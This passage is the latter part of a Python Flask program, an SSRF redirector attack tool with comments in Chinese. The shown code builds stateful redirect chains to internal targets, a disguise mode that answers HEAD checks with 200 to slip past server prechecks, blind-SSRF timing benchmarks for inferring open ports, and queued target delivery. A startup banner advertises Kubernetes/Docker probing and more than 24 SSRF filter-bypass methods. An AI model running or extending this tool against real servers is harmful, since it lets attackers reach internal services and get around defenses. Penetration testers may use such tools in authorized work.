            'ip': l['ip'],
            'method': l['method'],
            'path': p,
            'served_target': ed.get('served_target') or l.get('redirect_url') or '',
            'queue_index': ed.get('queue_index'),
        })

    prev = None
    deltas = []
    for h in hits:
        if prev is None:
            h['delta_ms'] = None
        else:
            h['delta_ms'] = round((h['ts'] - prev['ts']) * 1000)
            deltas.append(h['delta_ms'])
        prev = h

    auto_thr = 0.0
    if deltas:
        sd = sorted(deltas)
        median = sd[len(sd) // 2] if len(sd) % 2 else (sd[len(sd) // 2 - 1] + sd[len(sd) // 2]) / 2
        auto_thr = max(median * 2, median + 500)
    thr = threshold_ms if threshold_ms > 0 else auto_thr

    slow = fast = 0
    for h in hits:
        if h['delta_ms'] is None:
            h['verdict'] = 'first'
        elif thr > 0 and h['delta_ms'] >= thr:
            h['verdict'] = 'slow'
            slow += 1
        else:
            h['verdict'] = 'fast'
            fast += 1
        h.pop('ts', None)  # 内部时间戳不下发

    return jsonify({
        'hits': hits[-200:],
        'total': len(hits),
        'threshold_ms': round(thr, 1) if thr else 0,
        'auto_threshold': bool(thr and thr == auto_thr),
        'slow_count': slow,
        'fast_count': fast,
        'avg_delta_ms': round(sum(deltas) / len(deltas), 1) if deltas else 0,
    })

# ==================== v2.1: 盲SSRF基准测试响应路由 ====================
# /bb/* 命名空间优先级高于根路径有状态链分发 (Werkzeug 静态段优先), 返回完全可控的响应
@app.route('/bb', methods=SUPPORTED_METHODS)
@app.route('/bb/', methods=SUPPORTED_METHODS)
@app.route('/bb/<path:sub>', methods=SUPPORTED_METHODS)
def blind_bench_handler(sub=''):
    """
    盲SSRF基准端点: 按注册配置返回指定的状态码/响应体/响应头, 并应用人工延时。
    用于标定盲SSRF行为基线 —— 对比目标服务器请求不同端点时的外部可观测差异。
    """
    path = '/bb/' + sub if sub else '/bb/'
    start_ts = time.time()
    log_entry = log_request()

    ep_id = BLIND_BENCH_PATH.get(path)
    cfg = BLIND_BENCH.get(ep_id) if ep_id else None

    if not cfg:
        response = make_response('Blind benchmark endpoint not found', 404)
    else:
        delay_ms = cfg.get('delay_ms', 0) or 0
        if delay_ms > 0:
            time.sleep(delay_ms / 1000.0)

        status = cfg.get('status', 200)
        body = cfg.get('body', '')
        response = make_response(body, status)
        response.headers['Content-Type'] = cfg.get('content_type', 'text/html; charset=utf-8')
        for k, v in (cfg.get('headers') or {}).items():
            response.headers[k] = v

        cfg['hits'] = cfg.get('hits', 0) + 1
        cfg['last_hit'] = get_beijing_time()
        elapsed_ms = round((time.time() - start_ts) * 1000)
        log_entry['redirect_url'] = f'[盲SSRF基准 → 返回{status}, 配置延时{delay_ms}ms, 实际耗时{elapsed_ms}ms]'
        log_entry['extra_data'] = {
            'blind_bench': True,
            'endpoint_id': cfg['id'],
            'path': path,
            'configured_status': status,
            'delay_ms': delay_ms,
            'elapsed_ms': elapsed_ms,
        }

    log_entry['status_code'] = response.status_code
    log_entry['response_headers'] = dict(response.headers)
    try:
        log_entry['response_body'] = response.get_data(as_text=True)[:500]
    except:
        log_entry['response_body'] = ''
    return response

# ==================== v2.1: 盲SSRF基准测试管理 API ====================
def _bb_parse_payload():
    """解析并校验盲测端点的 JSON 配置, 返回 (cfg_dict, error_msg)"""
    try:
        data = request.get_json(force=True)
    except Exception:
        return None, 'Invalid JSON'

    path = bb_validate_path(data.get('path', ''))
    if not path:
        return None, 'Invalid path: 必须以 /bb/ 开头, 仅允许字母数字及 -_.~/ 字符, 长度 5-128'

    status = safe_int(data.get('status'), 200)
    if not (100 <= status <= 599):
        return None, 'Invalid status: 状态码必须在 100-599 之间'

    delay_ms = safe_int(data.get('delay_ms'), 0)
    if delay_ms < 0:
        delay_ms = 0
    if delay_ms > BB_MAX_DELAY_MS:
        delay_ms = BB_MAX_DELAY_MS

    body = data.get('body', '')
    if not isinstance(body, str):
        body = str(body)
    if len(body) > BB_MAX_BODY_LEN:
        body = body[:BB_MAX_BODY_LEN]

    content_type = str(data.get('content_type', 'text/html; charset=utf-8'))[:200] or 'text/html; charset=utf-8'

    headers = data.get('headers') or {}
    if not isinstance(headers, dict):
        return None, 'Invalid headers: 必须为对象 (键值对)'
    safe_headers = {}
    for k, v in headers.items():
        k = str(k).strip()
        if not k or len(k) > 64 or any(c in k for c in '\r\n:'):
            continue
        safe_headers[k] = str(v)[:500].replace('\r', ' ').replace('\n', ' ')

    desc = str(data.get('desc', ''))[:200]

    return {
        'path': path, 'status': status, 'body': body,
        'content_type': content_type, 'delay_ms': delay_ms,
        'headers': safe_headers, 'desc': desc,
    }, None

@app.route(CONSOLE_PATH + '/api/blind_bench', methods=['GET'])
def list_blind_bench():
    """列出全部盲测端点 (含命中统计)"""
    if not check_access_token():
        return jsonify({'error': 'Unauthorized'}), 401
    endpoints = sorted(BLIND_BENCH.values(), key=lambda e: e['path'])
    return jsonify({'endpoints': endpoints, 'total': len(endpoints)})

@app.route(CONSOLE_PATH + '/api/blind_bench', methods=['POST'])
def create_blind_bench():
    """新建盲测端点"""
    if not check_access_token():
        return jsonify({'error': 'Unauthorized'}), 401
    cfg, err = _bb_parse_payload()
    if err:
        return jsonify({'error': err}), 400
    if cfg['path'] in BLIND_BENCH_PATH:
        return jsonify({'error': f"Path \"{cfg['path']}\" already exists"}), 400
    ep = bb_register(**cfg)
    return jsonify({'message': 'Endpoint created', 'endpoint': ep})

@app.route(CONSOLE_PATH + '/api/blind_bench/<ep_id>', methods=['PUT'])
def update_blind_bench(ep_id):
    """编辑盲测端点 (状态码/响应体/延时/响应头等; 路径本身不可改, 需改路径请删除重建)"""
    if not check_access_token():
        return jsonify({'error': 'Unauthorized'}), 401
    ep = BLIND_BENCH.get(ep_id)
    if not ep:
        return jsonify({'error': f'Endpoint {ep_id} not found'}), 404
    cfg, err = _bb_parse_payload()
    if err:
        return jsonify({'error': err}), 400
    # 路径冲突检查: 仅当新路径指向其他端点时拒绝
    owner = BLIND_BENCH_PATH.get(cfg['path'])
    if owner and owner != ep_id:
        return jsonify({'error': f"Path \"{cfg['path']}\" already in use by another endpoint"}), 400
    # 应用修改 (保留命中统计)
    if cfg['path'] != ep['path']:
        del BLIND_BENCH_PATH[ep['path']]
        BLIND_BENCH_PATH[cfg['path']] = ep_id
    ep.update({
        'path': cfg['path'],
        'status': cfg['status'],
        'body': cfg['body'],
        'content_type': cfg['content_type'],
        'delay_ms': cfg['delay_ms'],
        'headers': cfg['headers'],
        'desc': cfg['desc'],
    })
    return jsonify({'message': 'Endpoint updated', 'endpoint': ep})

@app.route(CONSOLE_PATH + '/api/blind_bench/<ep_id>', methods=['DELETE'])
def delete_blind_bench(ep_id):
    """删除盲测端点"""
    if not check_access_token():
        return jsonify({'error': 'Unauthorized'}), 401
    ep = BLIND_BENCH.get(ep_id)
    if not ep:
        return jsonify({'error': f'Endpoint {ep_id} not found'}), 404
    if ep['path'] in BLIND_BENCH_PATH:
        del BLIND_BENCH_PATH[ep['path']]
    del BLIND_BENCH[ep_id]
    return jsonify({'message': f'Endpoint {ep_id} deleted', 'remaining': len(BLIND_BENCH)})

@app.route(CONSOLE_PATH + '/api/blind_bench/reset_stats', methods=['POST'])
def reset_blind_bench_stats():
    """重置全部端点的命中计数 (开始新一轮基准测试前使用)"""
    if not check_access_token():
        return jsonify({'error': 'Unauthorized'}), 401
    for ep in BLIND_BENCH.values():
        ep['hits'] = 0
        ep['last_hit'] = None
    return jsonify({'message': 'All benchmark stats reset', 'total': len(BLIND_BENCH)})

# v2.0: 根路径 / 与所有未知路径统一进入有状态链分发 —— 域名+端口(无路径)留给链的中转/终点节点
@app.route('/', methods=SUPPORTED_METHODS)
@app.route('/<path:custom_path>', methods=SUPPORTED_METHODS)
def handle_stateful_path(custom_path=None):
    path = '/' + (custom_path or '')
    log_entry = log_request()

    if path in PATH_MAP:
        chain_id, step_index = PATH_MAP[path]
        chain = STATEFUL_CHAINS.get(chain_id)
        if not chain:
            response = make_response('Chain expired or not found', 404)
        else:
            step = chain['steps'][step_index]
            code = step['code']

            # HEAD伪装检查：如果链启用了head_bypass且请求方法是HEAD
            chain_head_bypass = chain.get('head_bypass', False)
            if chain_head_bypass and request.method == 'HEAD':
                response = make_head_bypass_response()
                log_entry['redirect_url'] = f'[HEAD伪装绕过 → 返回200, 路径: {path}]'
                log_entry['extra_data'] = {
                    'head_bypass_triggered': True,
                    'chain_id': chain_id,
                    'step_index': step_index,
                    'path': path,
                    'actual_target': step['target']
                }
            else:
                # 正常重定向逻辑
                is_last_step = (step_index == len(chain['steps']) - 1)
                queue = chain.get('targets_queue', [])
                queue_exhausted = False
                target = None

                if is_last_step and queue:
                    queue_index = chain.get('queue_index', 0)
                    queue_mode = chain.get('queue_mode', 'sequential')

                    if queue_mode == 'loop':
                        target = queue[queue_index % len(queue)]
                        chain['queue_index'] = (queue_index + 1) % len(queue)
                    else:
                        if queue_index < len(queue):
                            target = queue[queue_index]
                            chain['queue_index'] = queue_index + 1
                        else:
                            # 顺序队列耗尽: 返回410, 与前端"(已耗尽)"提示保持一致
                            queue_exhausted = True
                else:
                    target = step['target']

                if queue_exhausted:
                    response = make_response('Queue exhausted', 410)
                    log_entry['redirect_url'] = '[批量队列已耗尽 → 返回410]'
                    log_entry['extra_data'] = {
                        'chain_id': chain_id,
                        'step_index': step_index,
                        'path': path,
                        'queue_exhausted': True
                    }
                else:
                    step['target'] = target
                    final_mode = chain.get('final_mode', '30x') if is_last_step else '30x'
                    if is_last_step and final_mode != '30x':
                        # 末跳降级跳转
                        response = make_fallback_response(target, final_mode)
                    else:
                        response = make_response(redirect(target, code=code))
                    log_entry['redirect_url'] = target
                    log_entry['extra_data'] = {
                        'chain_id': chain_id,
                        'step_index': step_index,
                        'path': path,
                        'queue_index': chain.get('queue_index', 0) if is_last_step and queue else None,
                        'served_target': target,
                        'head_bypass_enabled': chain_head_bypass,
                        'fallback_mode': final_mode if (is_last_step and final_mode != '30x') else None
                    }
    else:
        response = make_response('Not Found', 404)

    log_entry['status_code'] = response.status_code
    log_entry['response_headers'] = dict(response.headers)
    try:
        log_entry['response_body'] = response.get_data(as_text=True)[:500]
    except:
        log_entry['response_body'] = ''
    return response

@app.route(CONSOLE_PATH + '/api/logs', methods=['GET'])
def get_logs():
    if not check_access_token():
        return jsonify({'error': 'Unauthorized'}), 401
    return jsonify({'logs': LOGS[:50], 'total': len(LOGS)})

# ==================== v2.0: 启动配置向导 ====================
def ask(prompt, default=''):
    """交互输入封装: 空输入/非交互环境返回默认值"""
    try:
        val = input(prompt).strip()
        return val if val else default
    except (EOFError, KeyboardInterrupt):
        return default

def choose_port(protocol):
    """选择端口: 默认 HTTPS=443 / HTTP=80, 支持自定义; 占用或权限不足时自动重试"""
    default_port = 443 if protocol == 'https' else 80
    for _ in range(5):
        raw = ask(f'请输入监听端口 [默认 {default_port}]: ', str(default_port))
        if not raw.isdigit() or not (1 <= int(raw) <= 65535):
            print('❌ 端口必须为 1-65535 的数字, 请重新输入')
            continue
        port = int(raw)
        if not is_port_free(CONFIG['host'], port):
            print(f'❌ 端口 {port} 已被占用或无权限绑定 (Linux 绑定 80/443 需要 root), 请重试')
            continue
        return port
    print(f'⚠️ 多次重试失败, 使用默认端口 {default_port} 直接启动')
    return default_port

def setup_https():
    """HTTPS 证书配置: 自动生成自签名 (复用 ./ssl_cert/) 或指定已有证书"""
    cert_file = os.path.join(SSL_CERT_DIR, 'cert.pem')
    key_file = os.path.join(SSL_CERT_DIR, 'key.pem')
    print('\n📜 HTTPS 证书配置:')
    print('  [1] 自动管理自签名证书 (首次生成至 ./ssl_cert/, 之后复用)  ← 推荐')
    print('  [2] 使用已有证书 (输入 cert.pem 与 key.pem 路径)')
    choice = ask('请选择 [1]: ', '1')
    if choice == '2':
        cert = ask('  证书文件路径 (cert.pem): ')
        key = ask('  私钥文件路径 (key.pem): ')
        if cert and key and os.path.isfile(cert) and os.path.isfile(key):
            CONFIG['ssl_cert'], CONFIG['ssl_key'] = cert, key
            CONFIG['use_https'] = True
            print(f'  ✅ 已加载证书: {cert}')
            return True
        print('  ❌ 证书文件不存在, 回退到自动生成模式')
    # 自动模式: 已有证书则复用
    if os.path.isfile(cert_file) and os.path.isfile(key_file):
        print(f'  ♻️ 复用已有自签名证书: {cert_file}')
        CONFIG['ssl_cert'], CONFIG['ssl_key'] = cert_file, key_file
        CONFIG['use_https'] = True
        return True
    os.makedirs(SSL_CERT_DIR, exist_ok=True)
    print('  🔧 正在生成自签名证书 (SAN 含本机全部IP与 localhost)...')
    if generate_self_signed_cert(cert_file, key_file):
        CONFIG['ssl_cert'], CONFIG['ssl_key'] = cert_file, key_file
        CONFIG['use_https'] = True
        print(f'  ✅ 证书已生成: {cert_file}')
        return True
    print('  ❌ 证书生成失败 (需安装 cryptography 库或 openssl 命令行), 已回退 HTTP')
    CONFIG['use_https'] = False
    return False

def run_startup_wizard():
    """v2.0 启动向导: 优先选择 80/443, 支持 HTTPS 部署"""
    interactive = True
    try:
        interactive = sys.stdin.isatty()
    except Exception:
        interactive = False

    print('=' * 62)
    print('  ⚡ SSRF 30x Redirector v2.0 · 启动配置向导')
    print('=' * 62)

    if not interactive:
        # 非交互环境 (管道/服务): 默认 HTTPS·443 自动证书, 失败回退 HTTP·80
        print('ℹ️ 检测到非交互环境, 使用默认配置: HTTPS · 443 · 自签名证书')
        protocol = 'https'
    else:
        print('  请选择监听协议与端口 (80/443 优先推荐):')
        print('  [1] HTTPS · 端口 443   ← 推荐: 流量加密, 更贴近真实站点')
        print('  [2] HTTP  · 端口 80')
        print('  [3] HTTPS · 自定义端口')
        print('  [4] HTTP  · 自定义端口')
        choice = ask('请选择 [1]: ', '1')
        protocol = 'https' if choice in ('1', '3') else 'http'

    if protocol == 'https':
        if not interactive:
            if not setup_https():
                print('⚠️ 非交互环境证书生成失败, 已回退 HTTP · 80')
                protocol = 'http'
        else:
            setup_https()

    CONFIG['port'] = choose_port(protocol) if interactive else (443 if protocol == 'https' else 80)
    return protocol

if __name__ == '__main__':
    protocol = run_startup_wizard()
    proto_upper = 'HTTPS (加密)' if CONFIG['use_https'] else 'HTTP'
    local_ips = get_local_ips()

    print(f"\n{'=' * 62}")
    print(f"🚀 SSRF 实战 30x Redirector 引擎启动成功 (v2.0)")
    print(f"{'=' * 62}")
    print(f"🔒 传输协议: {proto_upper}")
    print(f"🌐 监听地址: {CONFIG['host']}:{CONFIG['port']}")
    print(f"🎲 本次控制台随机路径: {CONSOLE_PATH}/   (每次启动变化, 仅本次有效)")
    for ip in local_ips:
        scheme = 'https' if CONFIG['use_https'] else 'http'
        print(f"📍 控制台入口: {scheme}://{ip}:{CONFIG['port']}{CONSOLE_PATH}/")
    if CONFIG['use_https']:
        print(f"📜 证书: {CONFIG['ssl_cert']}")
        print(f"💡 提示: 自签名证书需客户端信任; 目标服务器若严格校验证书 (如 python requests verify=True),")
        print(f"   建议向导中选择 [2] 使用已签发的有效证书")
    print(f"🔓 根路径 / 已让渡给有状态链: 可注册 / /index.html /api/login 等任意逼真路径作为链入口")
    print(f"🛡️ 已深度集成 K8s / Docker 云原生 POST 自动化检测")
    print(f"🔒 有状态路径隐藏链已就绪 (支持实时查看/删除/修改末跳)")
    print(f"📦 批量队列投递模式已启用 (顺序/循环)")
    print(f"⚡ 队列预填充模块: {len(QUEUE_PRESETS)} 个探测分类已加载")
    print(f"🔧 Burp风格Raw HTTP请求编辑器已启用 (已修复CRLF解析兼容性)")
    print(f"✏️ 基础跳转 / 智能链 / 有状态链 均已启用高级请求编辑")
    print(f"🔀 HEAD伪装绕过模式已启用 (解决服务器HEAD预检拒绝30x问题)")
    print(f"⤵ 降级跳转模式已启用 (Refresh头 / Meta刷新 / JS跳转 / 组合, 支持链末跳)")
    print(f"📈 命中时间轴 + 端口开放启发式推断已启用 (日志面板第二标签页)")
    print(f"🧩 SSRF绕过助手已启用 (24+种方法, 按原理分类: 进制变形/IPv6/DNS解析/URL解析差异)")
    print(f"🎯 Payload URL 模块已集成首跳绕过变形 (对提交侧首跳 host 按原理分组自动生成变形供选择)")
    print(f"📋 变形 URL 批量复制已启用 (勾选/全选/反选/按组选择, 三种导出格式, 复制选中或全部)")
    print(f"🔐 日志面板XSS已修复 (ip/method/path/query/时间戳统一转义)")
    print(f"🩹 健壮性修复: code参数异常不再500, 顺序队列耗尽返回410")
    print(f"📋 日志删除仅前端隐藏，后端数据完整保留")
    print(f"🕐 日志时间显示为北京时间 (UTC+8)")
    print(f"🧪 盲SSRF基准测试模块已启用: /bb/* 默认基准组 (2xx/4xx/5xx/延时3s/超时30s), 支持自定义端点+延时")
    print(f"{'=' * 62}")

    ssl_context = (CONFIG['ssl_cert'], CONFIG['ssl_key']) if CONFIG['use_https'] else None
    app.run(host=CONFIG['host'], port=CONFIG['port'], debug=False, threaded=True, ssl_context=ssl_context)